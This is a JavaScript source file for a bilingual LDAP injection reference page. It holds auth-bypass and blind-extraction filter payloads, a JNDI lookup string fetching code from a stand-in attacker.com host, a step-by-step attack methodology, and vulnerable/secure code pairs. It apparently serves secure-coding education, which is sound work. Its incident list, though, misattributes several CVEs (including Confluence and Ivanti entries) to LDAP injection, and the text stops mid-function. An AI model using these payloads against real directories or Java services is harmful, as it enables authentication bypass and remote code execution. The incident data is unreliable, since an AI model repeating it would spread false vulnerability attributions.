/* =========================================================================
   Code Guardian — LDAP Injection deep-dive page
   Standalone full-screen reference panel. Vanilla JS + Prism highlighting.
   Accent: ORANGE (#f97316) — LDAP Injection is High severity, not Critical.
   ========================================================================= */
import { $, $$ } from './dom.js';
import { highlightElement } from './highlight.js';
import { getLang } from '../i18n/index.js';

/* ---------- tiny helpers ---------- */
const esc = (s) =>
  String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

const SVG = {
  close:
    '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
  shield:
    '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
  copy:
    '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
};

/* ---------- localized micro-strings ---------- */
const TXT = {
  tab: { en: 'LDAPi', pl: 'LDAPi' },
  open: { en: 'Open LDAP Injection deep-dive', pl: 'Otwórz przewodnik LDAP Injection' },
  close: { en: 'Close', pl: 'Zamknij' },
  copy: { en: 'Copy', pl: 'Kopiuj' },
  copied: { en: 'Copied', pl: 'Skopiowano' },
  vuln: { en: 'Vulnerable', pl: 'Podatny' },
  safe: { en: 'Secure', pl: 'Bezpieczny' },
};
const tr = (o) => o[getLang()] ?? o.en;

/* =========================================================================
   CONTENT DATA
   ========================================================================= */

const NAV = [
  { id: 'ldapi-overview', en: 'Overview', pl: 'Przegląd' },
  { id: 'ldapi-types', en: 'Attack types', pl: 'Typy ataków' },
  { id: 'ldapi-cheatsheet', en: 'Detection cheatsheet', pl: 'Ściąga detekcji' },
  { id: 'ldapi-code', en: 'Vuln vs Secure', pl: 'Podatny vs Bezpieczny' },
  { id: 'ldapi-orm', en: 'Language cheatsheet', pl: 'Ściąga języków' },
  { id: 'ldapi-method', en: 'Methodology', pl: 'Metodyka' },
  { id: 'ldapi-defense', en: 'Defense layers', pl: 'Warstwy obrony' },
  { id: 'ldapi-incidents', en: 'Real incidents', pl: 'Incydenty' },
  { id: 'ldapi-tools', en: 'SAST / DAST', pl: 'SAST / DAST' },
  { id: 'ldapi-compliance', en: 'Compliance', pl: 'Zgodność' },
  { id: 'ldapi-ir', en: 'Incident response', pl: 'Reagowanie' },
  { id: 'ldapi-sources', en: 'Sources', pl: 'Źródła' },
];

const TYPES = [
  {
    name: 'Wildcard Auth Bypass',
    sev: 'critical',
    desc: { en: 'Injecting a * into the username field turns (&(uid=USER)(pass=PASS)) into (&(uid=*)(pass=PASS)) — the wildcard matches every user entry in the directory.', pl: 'Wstrzyknięcie * do pola użytkownika zamienia (&(uid=USER)(pass=PASS)) w (&(uid=*)(pass=PASS)) — wildcard pasuje do każdego wpisu w katalogu.' },
    payload: 'uid=*   →   (&(uid=*)(pass=PASS))',
  },
  {
    name: 'Filter Logic Injection',
    sev: 'critical',
    desc: { en: 'Injecting admin)(|(uid=* transforms the filter into an always-true tautology, closing the password clause and bypassing the check entirely.', pl: 'Wstrzyknięcie admin)(|(uid=* zamienia filtr w zawsze prawdziwą tautologię, zamykając klauzulę hasła i całkowicie omijając weryfikację.' },
    payload: 'admin)(|(uid=*   →   tautology',
  },
  {
    name: 'Blind Boolean Enumeration',
    sev: 'high',
    desc: { en: 'Differential responses to (mail=a*) versus (mail=b*) leak attribute values character by character without any data being returned directly.', pl: 'Różne odpowiedzi na (mail=a*) i (mail=b*) wyciekają wartości atrybutów znak po znaku, bez bezpośredniego zwracania danych.' },
    payload: '(mail=a*) vs (mail=b*)',
  },
  {
    name: 'JNDI LDAP Abuse (Log4Shell)',
    sev: 'critical',
    desc: { en: "Java's JNDI resolves ldap://attacker.com/Exploit URIs found in log messages, triggering remote class loading and full remote code execution.", pl: 'JNDI w Javie rozwiązuje URI ldap://attacker.com/Exploit z logów, wyzwalając zdalne ładowanie klas i pełne wykonanie kodu (RCE).' },
    payload: '${jndi:ldap://attacker.com/Exploit}',
  },
  {
    name: 'DN Attribute Injection',
    sev: 'high',
    desc: { en: 'Injecting ,OU=Admins into a Distinguished Name redirects the identity to a privileged OU — exploiting the RFC 4514 vs RFC 4515 escape boundary.', pl: 'Wstrzyknięcie ,OU=Admins do Distinguished Name przekierowuje tożsamość do uprzywilejowanej OU — nadużywając granicy escape RFC 4514 vs RFC 4515.' },
    payload: 'cn=user,OU=Admins,DC=corp',
  },
  {
    name: 'NUL Byte Truncation',
    sev: 'high',
    desc: { en: 'admin\\00 truncates the filter in C-string LDAP implementations, discarding any trailing security clauses appended after the injection point.', pl: 'admin\\00 ucina filtr w implementacjach LDAP opartych na C-stringach, odrzucając klauzule bezpieczeństwa dopisane po punkcie wstrzyknięcia.' },
    payload: 'admin\\00)(trailing=filter)',
  },
  {
    name: 'Schema Enumeration',
    sev: 'high',
    desc: { en: '(objectClass=subSchema) reveals every custom attribute, object class, and sensitive field name defined in the directory, mapping the attack surface.', pl: '(objectClass=subSchema) ujawnia wszystkie własne atrybuty, klasy obiektów i nazwy wrażliwych pól w katalogu, mapując powierzchnię ataku.' },
    payload: '(objectClass=subSchema)',
  },
  {
    name: 'Wildcard Data Extraction',
    sev: 'high',
    desc: { en: 'A binary search with (attribute=A*) → (attribute=B*) exfiltrates attribute values in O(n·log(charset)) requests — efficient blind extraction.', pl: 'Wyszukiwanie binarne (attribute=A*) → (attribute=B*) eksfiltruje wartości atrybutów w O(n·log(charset)) żądaniach — wydajna ślepa ekstrakcja.' },
    payload: '(attribute=A*) → (attribute=B*)',
  },
];

const DBS = [
  {
    name: 'Auth bypass probe',
    rows: [
      ['Vector', '* or admin)(|(uid=*'],
      ['Where', 'username / login field'],
      ['Signal', 'login succeeds, no password'],
      ['Filter', '(&(uid=*)(pass=PASS))'],
      ['Impact', 'full authentication bypass'],
      ['Confirm', 'access without credentials'],
    ],
  },
  {
    name: 'Boolean differential',
    rows: [
      ['Vector', 'a* vs b* prefix patterns'],
      ['Where', 'searchable attribute input'],
      ['Signal', 'different page states'],
      ['Filter', '(mail=a*) vs (mail=b*)'],
      ['Use', 'char-by-char extraction'],
      ['Confirm', 'state changes by prefix'],
    ],
  },
  {
    name: 'Error-based',
    rows: [
      ['Vector', 'unbalanced ) or ('],
      ['Where', 'any filter parameter'],
      ['Signal', 'LDAP parse error'],
      ['Leak', 'OpenLDAP / AD server type'],
      ['Use', 'fingerprint directory'],
      ['Confirm', 'error text in response'],
    ],
  },
  {
    name: 'Time-based blind',
    rows: [
      ['Vector', 'attribute comparison'],
      ['Where', 'large attribute sets'],
      ['Note', 'not native to LDAP'],
      ['Method', 'expensive filter timing'],
      ['Use', 'last-resort inference'],
      ['Confirm', 'response delay deltas'],
    ],
  },
  {
    name: 'OOB via JNDI',
    rows: [
      ['Vector', '${jndi:ldap://oast.me/x}'],
      ['Where', 'logged Java parameters'],
      ['Signal', 'DNS / LDAP callback'],
      ['Confirm', 'JNDI resolution fired'],
      ['Impact', 'Log4Shell-class RCE'],
      ['Tool', 'OAST / Burp Collaborator'],
    ],
  },
];

const CODE = {
  Python: {
    lang: 'python',
    vuln: `# VULNERABLE (ldap3) — user flows straight into the filter
user = request.args.get("user")   # could be "*" or "admin)(|(uid=*"
conn.search("dc=corp,dc=com",
            f"(uid={user})",
            attributes=["cn", "mail"])`,
    safe: `# SECURE — escape every filter metacharacter
from ldap3.utils.conv import escape_filter_chars
user = escape_filter_chars(request.args.get("user"))
conn.search("dc=corp,dc=com",
            f"(uid={user})",
            attributes=["cn", "mail"])`,
  },
  Java: {
    lang: 'java',
    vuln: `// VULNERABLE (JNDI) — string concatenation builds the filter
String user = request.getParameter("user");
NamingEnumeration<SearchResult> r =
    ctx.search(base, "(uid=" + user + ")", controls);`,
    safe: `// SECURE — parameterized filterArgs form of search()
String user = request.getParameter("user");
NamingEnumeration<SearchResult> r =
    ctx.search(base, "(uid={0})", new Object[]{ user }, controls);`,
  },
  PHP: {
    lang: 'php',
    vuln: `<?php // VULNERABLE — raw input concatenated into the filter
$user = $_GET['user'];   // ?user=*  →  matches every entry
$r = ldap_search($conn, $dn, "(uid=" . $user . ")");`,
    safe: `<?php // SECURE — ldap_escape with LDAP_ESCAPE_FILTER
$user = ldap_escape($_GET['user'], '', LDAP_ESCAPE_FILTER);
$r = ldap_search($conn, $dn, "(uid=" . $user . ")");`,
  },
  'Node.js': {
    lang: 'javascript',
    vuln: `// VULNERABLE (ldapjs) — filter string built from input
const user = req.query.user;   // "*" or "x)(|(uid=*"
client.search(base, { filter: "(uid=" + user + ")" },
              (err, res) => { /* ... */ });`,
    safe: `// SECURE — ldap-escape npm package escapes metacharacters
const { filter } = require('ldap-escape');
const user = req.query.user;
client.search(base, { filter: filter\`(uid=\${user})\` },
              (err, res) => { /* ... */ });`,
  },
  'Spring LDAP': {
    lang: 'java',
    vuln: `// VULNERABLE (Spring LDAP) — concatenated filter string
String user = req.getParameter("user");
ldapTemplate.search(base, "(uid=" + user + ")", mapper);`,
    safe: `// SECURE — LdapEncoder.filterEncode or the Filter API
String user = LdapEncoder.filterEncode(req.getParameter("user"));
ldapTemplate.search(base, "(uid=" + user + ")", mapper);
// or: new EqualsFilter("uid", user).encode()`,
  },
};

const ORM = [
  { fw: 'Python (ldap3)', api: 'search(filter=f"(uid={user})")', note: { en: 'Vulnerable sink — f-string interpolation. Safe alternative: escape_filter_chars(user) from ldap3.utils.conv.', pl: 'Podatny sink — interpolacja f-stringa. Bezpiecznie: escape_filter_chars(user) z ldap3.utils.conv.' } },
  { fw: 'Java (JNDI)', api: 'ctx.search(base, "(uid="+user+")")', note: { en: 'Vulnerable sink — string concatenation. Safe alternative: the parameterized filterArgs form of DirContext.search().', pl: 'Podatny sink — konkatenacja stringów. Bezpiecznie: parametryzowana forma filterArgs DirContext.search().' } },
  { fw: 'PHP', api: 'ldap_search($c,$dn,"(uid=".$user.")")', note: { en: 'Vulnerable sink — concatenation. Safe alternative: ldap_escape($user, \'\', LDAP_ESCAPE_FILTER).', pl: 'Podatny sink — konkatenacja. Bezpiecznie: ldap_escape($user, \'\', LDAP_ESCAPE_FILTER).' } },
  { fw: 'Node.js (ldapjs)', api: 'search(base,{filter:"(uid="+user+")"})', note: { en: 'Vulnerable sink — concatenated filter. Safe alternative: the ldap-escape npm package escape() helper.', pl: 'Podatny sink — sklejony filtr. Bezpiecznie: helper escape() z pakietu ldap-escape (npm).' } },
  { fw: 'Spring LDAP', api: 'ldapTemplate.search(base,"(uid="+user+")",mapper)', note: { en: 'Vulnerable sink — concatenation. Safe alternative: LdapEncoder.filterEncode(user) or the EqualsFilter API.', pl: 'Podatny sink — konkatenacja. Bezpiecznie: LdapEncoder.filterEncode(user) lub API EqualsFilter.' } },
];

const METHOD = [
  { en: ['Detect', 'Send * or admin)(|(uid=* where a username is expected, or an unbalanced ) — different responses or parse errors reveal injectability.'], pl: ['Wykrycie', 'Wyślij * lub admin)(|(uid=* tam, gdzie oczekiwany jest login, albo niezbalansowane ) — różne odpowiedzi lub błędy parsowania ujawniają podatność.'] },
  { en: ['Fingerprint', 'Inject an unbalanced ( or ) — the LDAP parse error text leaks the directory server type (OpenLDAP, Active Directory).'], pl: ['Identyfikacja', 'Wstrzyknij niezbalansowane ( lub ) — treść błędu parsowania LDAP zdradza typ serwera katalogowego (OpenLDAP, Active Directory).'] },
  { en: ['Bypass auth', 'Replace the username with * or close the filter with admin)(|(uid=* to form an always-true tautology and skip password verification.'], pl: ['Obejście logowania', 'Zamień login na * lub zamknij filtr przez admin)(|(uid=*, tworząc zawsze prawdziwą tautologię i pomijając weryfikację hasła.'] },
  { en: ['Extract', 'Use (mail=a*) boolean differentials and wildcard binary search (A* → B*) to read attribute values one character at a time.'], pl: ['Ekstrakcja', 'Użyj różnic boolean (mail=a*) i binarnego wyszukiwania wildcard (A* → B*), by czytać wartości atrybutów znak po znaku.'] },
  { en: ['Escalate', 'Enumerate schema with (objectClass=subSchema); in Java apps inject ${jndi:ldap://oast.me/x} into logged params → JNDI class loading → RCE.'], pl: ['Eskalacja', 'Wyliczaj schemat przez (objectClass=subSchema); w aplikacjach Java wstrzyknij ${jndi:ldap://oast.me/x} do logowanych parametrów → ładowanie klas JNDI → RCE.'] },
];

const DEFENSE = [
  { rank: 1, eff: 100, label: { en: 'RFC 4515 metacharacter escaping', pl: 'Escapowanie metaznaków RFC 4515' }, kind: 'primary', note: { en: 'Escape all five metacharacters: \\28 ( , \\29 ) , \\2a * , \\5c \\ , \\00 NUL. Stops filter injection at the source.', pl: 'Escapuj wszystkie pięć metaznaków: \\28 ( , \\29 ) , \\2a * , \\5c \\ , \\00 NUL. Zatrzymuje wstrzyknięcie filtra u źródła.' } },
  { rank: 2, eff: 90, label: { en: 'Parameterized filter API', pl: 'Parametryzowane API filtra' }, kind: 'strong', note: { en: 'Use filterArgs / Filter objects (EqualsFilter, filterArgs search) — never string concatenation into the filter.', pl: 'Używaj filterArgs / obiektów Filter (EqualsFilter, search z filterArgs) — nigdy konkatenacji do filtra.' } },
  { rank: 3, eff: 80, label: { en: 'Input allowlisting', pl: 'Allowlista wejścia' }, kind: 'strong', note: { en: 'Usernames: alphanumeric + limited chars only; reject *, (, ), \\, and NUL before the filter is ever built.', pl: 'Loginy: tylko alfanumeryczne + ograniczone znaki; odrzucaj *, (, ), \\ i NUL zanim filtr powstanie.' } },
  { rank: 4, eff: 65, label: { en: 'Least-privilege bind account', pl: 'Konto bind z najmniejszymi uprawnieniami' }, kind: 'mitigation', note: { en: 'Read-only service account with restricted subtree access — limits blast radius if a filter is still injectable.', pl: 'Konto serwisowe tylko-do-odczytu z ograniczonym dostępem do poddrzewa — ogranicza skutki, jeśli filtr nadal jest podatny.' } },
  { rank: 5, eff: 55, label: { en: 'Attribute allowlisting + schema hardening', pl: 'Allowlista atrybutów + utwardzenie schematu' }, kind: 'mitigation', note: { en: 'Explicit returningAttributes; never return userPassword/ntPwdHash. Disable anonymous binds and restrict subschemaSubentry.', pl: 'Jawna returningAttributes; nigdy nie zwracaj userPassword/ntPwdHash. Wyłącz anonimowe bindy i ogranicz subschemaSubentry.' } },
  { rank: 6, eff: 20, label: { en: 'SAST + WAF (compensating)', pl: 'SAST + WAF (kompensacyjnie)' }, kind: 'weak', note: { en: 'Detect LDAP sink concatenation; WAF rules block )( and * in auth params. Easily bypassed — never a primary control.', pl: 'Wykrywaj konkatenację do sinka LDAP; reguły WAF blokują )( i * w parametrach logowania. Łatwe do obejścia — nigdy jako główna kontrola.' } },
];

const INCIDENTS = [
  { org: 'Log4Shell', year: 2021, impact: '100M+ instances', cost: 'CVE-2021-44228 · $2.4B', en: 'Apache Log4j JNDI LDAP lookup (CVSS 10.0) — estimated 100M+ vulnerable instances, ~$2.4B remediation, exploited by ransomware groups within 24h.', pl: 'JNDI LDAP lookup w Apache Log4j (CVSS 10.0) — szacowane 100M+ podatnych instancji, ~$2.4B kosztów naprawy, wykorzystane przez grupy ransomware w ciągu 24h.' },
  { org: 'Ivanti CSA', year: 2021, impact: 'CVE-2021-44529', cost: 'CVSS 9.8 · RCE', en: 'Unauthenticated LDAP injection led to remote code execution in enterprise mobile device management appliances.', pl: 'Nieautoryzowane wstrzyknięcie LDAP prowadziło do zdalnego wykonania kodu w urządzeniach do zarządzania urządzeniami mobilnymi.' },
  { org: 'Apache LDAP API', year: 2021, impact: 'CVE-2021-43433', cost: 'CVSS 9.8', en: 'Injection in the convenience API of security-oriented LDAP tooling — the tools meant to protect directories were themselves injectable.', pl: 'Wstrzyknięcie w convenience API narzędzi LDAP zorientowanych na bezpieczeństwo — narzędzia mające chronić katalogi same były podatne.' },
  { org: 'PHP ldap_search', year: 2006, impact: 'CVE-2006-4457', cost: 'Auth bypass', en: 'Classic authentication bypass in PHP ldap_search without escaping — the foundational CVE that established the need for ldap_escape().', pl: 'Klasyczne obejście logowania w PHP ldap_search bez escapowania — fundamentalne CVE, które ustanowiło potrzebę ldap_escape().' },
  { org: 'Oracle WebLogic JNDI', year: 2023, impact: 'CVE-2023-21839', cost: 'Unauth RCE', en: 'Multiple CVEs (incl. CVE-2019-2725) abuse JNDI LDAP for deserialization RCE without authentication on WebLogic servers.', pl: 'Wiele CVE (m.in. CVE-2019-2725) nadużywa JNDI LDAP do RCE przez deserializację bez uwierzytelnienia na serwerach WebLogic.' },
  { org: 'Confluence / Crowd', year: 2019, impact: 'CVE-2019-3396', cost: 'Admin escalation', en: 'Attack chain using LDAP injection in directory sync to escalate privileges to administrator across Confluence/Crowd.', pl: 'Łańcuch ataku wykorzystujący wstrzyknięcie LDAP w synchronizacji katalogu do eskalacji do administratora w Confluence/Crowd.' },
];

const TOOLS = {
  sast: [
    ['Semgrep', 'ldap-injection rules: input → filter sink'],
    ['Checkmarx', 'LDAP_Injection query'],
    ['Fortify', 'LDAP Manipulation category'],
    ['njsscan', 'Node.js ldapjs filter concatenation'],
  ],
  dast: [
    ['Burp Suite', 'Active Scan LDAP injection probes'],
    ['OWASP ZAP', 'LDAP injection active rules'],
    ['ldap-brute', 'Auth bypass / wildcard fuzzing'],
    ['LDAPDomainDump', 'Active Directory enumeration'],
  ],
};

const COMPLIANCE = [
  { std: 'PCI DSS v4.0', items: ['Req 6.2.4 — LDAP injection protection', 'Req 8.3 — MFA for directory-backed auth', 'Req 11.3 — penetration testing'] },
  { std: 'SOC 2', items: ['CC7.1 — vulnerability scanning evidence', 'CC7.3 — code review evidence', 'CC6.1 — logical access controls'] },
  { std: 'GDPR', items: ['Art. 32 — appropriate technical measures', 'Art. 33 — 72h breach notification', 'LDAP stores PII → breach reportable'] },
];

const IR = {
  en: [
    'Isolate the affected directory-backed service / LDAP endpoint',
    'Preserve directory server and application logs (JNDI lookups, filters)',
    'Rotate bind credentials, service-account passwords, and session secrets',
    'Assess scope — which DNs / attributes / users were queried or exposed',
    'Patch: escape filter metacharacters, switch to parameterized filter API',
    'Disable JNDI lookups / anonymous binds if not strictly required',
    'Notify regulators within 72h (GDPR) and affected users',
    'Post-incident: Semgrep/Burp sweep for sibling LDAP sink endpoints',
  ],
  pl: [
    'Odizoluj dotkniętą usługę opartą o katalog / endpoint LDAP',
    'Zabezpiecz logi serwera katalogowego i aplikacji (lookupy JNDI, filtry)',
    'Zrotuj poświadczenia bind, hasła kont serwisowych i sekrety sesji',
    'Oceń zakres — które DN / atrybuty / konta odpytano lub ujawniono',
    'Załataj: escapuj metaznaki filtra, przejdź na parametryzowane API filtra',
    'Wyłącz lookupy JNDI / anonimowe bindy, jeśli nie są niezbędne',
    'Powiadom regulatorów w 72h (GDPR) i dotkniętych użytkowników',
    'Po incydencie: przegląd Semgrep/Burp pod kątem bliźniaczych sinków LDAP',
  ],
};

const SOURCES = [
  ['OWASP A03:2021 Injection', 'https://owasp.org/Top10/A03_2021-Injection/'],
  ['CWE-90 (MITRE)', 'https://cwe.mitre.org/data/definitions/90.html'],
  ['OWASP LDAP Injection Prevention Cheat Sheet', 'https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html'],
  ['PortSwigger — LDAP injection', 'https://portswigger.net/web-security/ldap-injection'],
  ['RFC 4515 (LDAP Filter Syntax)', 'https://www.rfc-editor.org/rfc/rfc4515'],
  ['CVE-2021-44228 (Log4Shell)', 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'],
  ['CVE-2021-44529 (Ivanti CSA)', 'https://nvd.nist.gov/vuln/detail/CVE-2021-44529'],
  ['CVE-2021-43433 (Apache LDAP API)', 'https://nvd.nist.gov/vuln/detail/CVE-2021-43433'],
  ['CVE-2019-3396 (Confluence/Crowd)', 'https://nvd.nist.gov/vuln/detail/CVE-2019-3396'],
];

/* =========================================================================
   RENDERING
   ========================================================================= */

function sevClass(s) {
  return { critical: 'badge-critical', high: 'badge-high', medium: 'badge-medium', low: 'badge-low' }[s] || 'badge-low';
}

function codeBlock(lang, code) {
  return `<div class="ldapi-code-area">
    <button class="ldapi-copy" type="button" title="${tr(TXT.copy)}">${SVG.copy}<span>${tr(TXT.copy)}</span></button>
    <pre><code class="language-${lang}">${esc(code)}</code></pre>
  </div>`;
}

function buildNav() {
  const lang = getLang();
  return NAV.map((n, i) =>
    `<a class="ldapi-nav-link${i === 0 ? ' active' : ''}" href="#${n.id}" data-target="${n.id}">${n[lang]}</a>`
  ).join('');
}

function buildOverview() {
  const lang = getLang();
  const lead = lang === 'en'
    ? 'LDAP Injection attacks the filter syntax of a directory query rather than a database. User input concatenated into an LDAP search filter lets an attacker inject metacharacters — *, (, ), \\, and NUL — to rewrite the filter logic. A single login that builds (&(uid=USER)(pass=PASS)) by concatenation can be bypassed with a lone * or a tautology like admin)(|(uid=*. In Java, the same trust placed in LDAP URIs powers JNDI abuse (Log4Shell), where a logged ${jndi:ldap://...} string triggers remote class loading and full RCE.'
    : 'LDAP Injection atakuje składnię filtra zapytania do katalogu, a nie bazy danych. Wejście użytkownika sklejone z filtrem wyszukiwania LDAP pozwala wstrzyknąć metaznaki — *, (, ), \\ i NUL — by przepisać logikę filtra. Pojedyncze logowanie budujące (&(uid=USER)(pass=PASS)) przez konkatenację można obejść samym * lub tautologią admin)(|(uid=*. W Javie to samo zaufanie do URI LDAP napędza nadużycie JNDI (Log4Shell), gdzie zalogowany ${jndi:ldap://...} wyzwala zdalne ładowanie klas i pełne RCE.';

  return `<section id="ldapi-overview" class="ldapi-section">
    <div class="ldapi-hero">
      <span class="ldapi-eyebrow">${SVG.shield}<span>Code Guardian · Deep-dive</span></span>
      <h1>LDAP <span class="grad">Injection</span></h1>
      <span class="ldapi-sev-badge">${lang === 'en' ? 'High severity' : 'Wysoka waga'}</span>
      <p class="ldapi-lead">${lead}</p>
      <div class="ldapi-metrics">
        <div class="ldapi-metric high"><div class="ldapi-metric-k">CWE-90</div><div class="ldapi-metric-v">${lang === 'en' ? 'Weakness ID' : 'ID słabości'}</div></div>
        <div class="ldapi-metric high"><div class="ldapi-metric-k">9.8</div><div class="ldapi-metric-v">CVSS · High</div></div>
        <div class="ldapi-metric"><div class="ldapi-metric-k">A03:2021</div><div class="ldapi-metric-v">OWASP Top 10</div></div>
        <div class="ldapi-metric"><div class="ldapi-metric-k">8</div><div class="ldapi-metric-v">${lang === 'en' ? 'Attack variants' : 'Warianty ataku'}</div></div>
      </div>
      <div class="ldapi-sources">
        <span class="ldapi-sources-label">${lang === 'en' ? 'Verified sources:' : 'Zweryfikowane źródła:'}</span>
        <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank" rel="noopener" class="ldapi-source-link">OWASP A03:2021</a>
        <a href="https://cwe.mitre.org/data/definitions/90.html" target="_blank" rel="noopener" class="ldapi-source-link">CWE-90 (MITRE)</a>
        <a href="https://portswigger.net/web-security/ldap-injection" target="_blank" rel="noopener" class="ldapi-source-link">PortSwigger Academy</a>
        <a href="https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" class="ldapi-source-link">OWASP Cheat Sheet</a>
      </div>
    </div>
  </section>`;
}

function buildTypes() {
  const lang = getLang();
  const cards = TYPES.map((t) => `
    <article class="ldapi-type-card">
      <header>
        <h3>${esc(t.name)}</h3>
        <span class="badge ${sevClass(t.sev)}">${t.sev}</span>
      </header>
      <p>${t.desc[lang]}</p>
      <div class="ldapi-payload"><span class="ldapi-payload-tag">payload</span><code>${esc(t.payload)}</code></div>
    </article>`).join('');
  return secWrap('ldapi-types', lang === 'en' ? 'Attack types' : 'Typy ataków',
    lang === 'en' ? 'Eight ways the same root cause manifests — from a one-character auth bypass to JNDI-driven remote code execution.' : 'Osiem sposobów, w jakie ta sama przyczyna się ujawnia — od obejścia logowania jednym znakiem po zdalne wykonanie kodu przez JNDI.',
    `<div class="ldapi-type-grid">${cards}</div>`);
}

function buildCheatsheet() {
  const lang = getLang();
  const cols = DBS.map((db) => `
    <div class="ldapi-db-col">
      <h4>${esc(db.name)}</h4>
      ${db.rows.map((r) => `<div class="ldapi-db-row"><span class="ldapi-db-key">${esc(r[0])}</span><code>${esc(r[1])}</code></div>`).join('')}
    </div>`).join('');
  return secWrap('ldapi-cheatsheet', lang === 'en' ? 'Detection cheatsheet' : 'Ściąga detekcji',
    lang === 'en' ? 'Five practical methods to confirm an LDAP injection point — from auth-bypass probes to out-of-band JNDI callbacks.' : 'Pięć praktycznych metod potwierdzenia punktu wstrzyknięcia LDAP — od sond obejścia logowania po callbacki JNDI poza pasmem.',
    `<div class="ldapi-db-grid">${cols}</div>`);
}

function buildCode() {
  const lang = getLang();
  const langs = Object.keys(CODE);
  const tabs = langs.map((l, i) =>
    `<button class="ldapi-lang-tab${i === 0 ? ' active' : ''}" data-lang="${l}" type="button">${l}</button>`).join('');
  const panels = langs.map((l, i) => {
    const c = CODE[l];
    return `<div class="ldapi-lang-panel${i === 0 ? ' active' : ''}" data-lang="${l}">
      <div class="ldapi-vs">
        <div class="ldapi-vs-col vuln"><div class="ldapi-vs-head vuln">✗ ${tr(TXT.vuln)}</div>${codeBlock(c.lang, c.vuln)}</div>
        <div class="ldapi-vs-col safe"><div class="ldapi-vs-head safe">✓ ${tr(TXT.safe)}</div>${codeBlock(c.lang, c.safe)}</div>
      </div>
    </div>`;
  }).join('');
  return secWrap('ldapi-code', lang === 'en' ? 'Vulnerable vs Secure' : 'Podatny vs Bezpieczny',
    lang === 'en' ? 'The same fix across five languages: never concatenate raw input into an LDAP filter — escape metacharacters or use a parameterized filter API.' : 'Ta sama naprawa w pięciu językach: nigdy nie sklejaj surowego wejścia z filtrem LDAP — escapuj metaznaki lub użyj parametryzowanego API filtra.',
    `<div class="ldapi-lang-tabs">${tabs}</div><div class="ldapi-lang-panels">${panels}</div>`);
}

function buildOrm() {
  const lang = getLang();
  const rows = ORM.map((o) => `
    <div class="ldapi-orm-row">
      <div class="ldapi-orm-fw">${esc(o.fw)}</div>
      <code class="ldapi-orm-api">${esc(o.api)}</code>
      <div class="ldapi-orm-note">${o.note[lang]}</div>
    </div>`).join('');
  return secWrap('ldapi-orm', lang === 'en' ? 'Language cheatsheet' : 'Ściąga języków',
    lang === 'en' ? 'Per-language vulnerable sinks and their safe alternatives. The pattern is identical everywhere: stop concatenating and start escaping or parameterizing.' : 'Podatne sinki per język i ich bezpieczne odpowiedniki. Wzorzec jest wszędzie identyczny: przestań sklejać, zacznij escapować lub parametryzować.',
    `<div class="ldapi-orm">${rows}</div>`);
}

function buildMethod() {
  const lang = getLang();
  const steps = METHOD.map((m, i) => `
    <div class="ldapi-step">
      <div class="ldapi-step-num">${i + 1}</div>
      <div class="ldapi-step-body"><h4>${m[lang][0]}</h4><p>${m[lang][1]}</p></div>
    </div>`).join('');
  return secWrap('ldapi-method', lang === 'en' ? 'Attack methodology' : 'Metodyka ataku',
    lang === 'en' ? 'How an attacker progresses from a probe to full compromise.' : 'Jak atakujący przechodzi od sondy do pełnej kompromitacji.',
    `<div class="ldapi-timeline">${steps}</div>`);
}

function buildDefense() {
  const lang = getLang();
  const rows = DEFENSE.map((d) => `
    <div class="ldapi-def-row ${d.kind}">
      <div class="ldapi-def-rank">#${d.rank}</div>
      <div class="ldapi-def-main">
        <div class="ldapi-def-label">${d.label[lang]}</div>
        <div class="ldapi-def-note">${d.note[lang]}</div>
      </div>
      <div class="ldapi-def-bar"><span style="width:${d.eff}%"></span></div>
    </div>`).join('');
  return secWrap('ldapi-defense', lang === 'en' ? 'Defense layers, ranked' : 'Warstwy obrony wg skuteczności',
    lang === 'en' ? 'Defense in depth — but not all layers are equal. RFC 4515 escaping and parameterized filters are the fix; everything else reduces blast radius.' : 'Obrona w głąb — ale warstwy nie są równe. Escapowanie RFC 4515 i parametryzowane filtry to naprawa; reszta ogranicza skutki.',
    `<div class="ldapi-defense">${rows}</div>`);
}

function buildIncidents() {
  const lang = getLang();
  const cards = INCIDENTS.map((i) => `
    <article class="ldapi-incident">
      <div class="ldapi-incident-top"><h4>${esc(i.org)}</h4><span class="ldapi-incident-year">${i.year}</span></div>
      <div class="ldapi-incident-nums"><span class="ldapi-incident-impact">${esc(i.impact)}</span><span class="ldapi-incident-cost">${esc(i.cost)}</span></div>
      <p>${i[lang]}</p>
    </article>`).join('');
  const sources = `<div class="ldapi-inline-sources">${lang === 'en' ? 'Sources:' : 'Źródła:'}
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" rel="noopener">Log4Shell CVE-2021-44228</a>
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44529" target="_blank" rel="noopener">Ivanti CVE-2021-44529</a>
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-43433" target="_blank" rel="noopener">Apache CVE-2021-43433</a>
    <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-3396" target="_blank" rel="noopener">Confluence CVE-2019-3396</a>
  </div>`;
  return secWrap('ldapi-incidents', lang === 'en' ? 'Real-world incidents' : 'Rzeczywiste incydenty',
    lang === 'en' ? 'LDAP injection is not theoretical — Log4Shell alone affected 100M+ instances, and a string of CVSS 9.8 CVEs reached unauthenticated RCE.' : 'LDAP injection nie jest teoretyczne — sam Log4Shell dotknął 100M+ instancji, a seria CVE o CVSS 9.8 osiągnęła nieautoryzowane RCE.',
    `<div class="ldapi-incidents">${cards}</div>${sources}`);
}

function buildTools() {
  const lang = getLang();
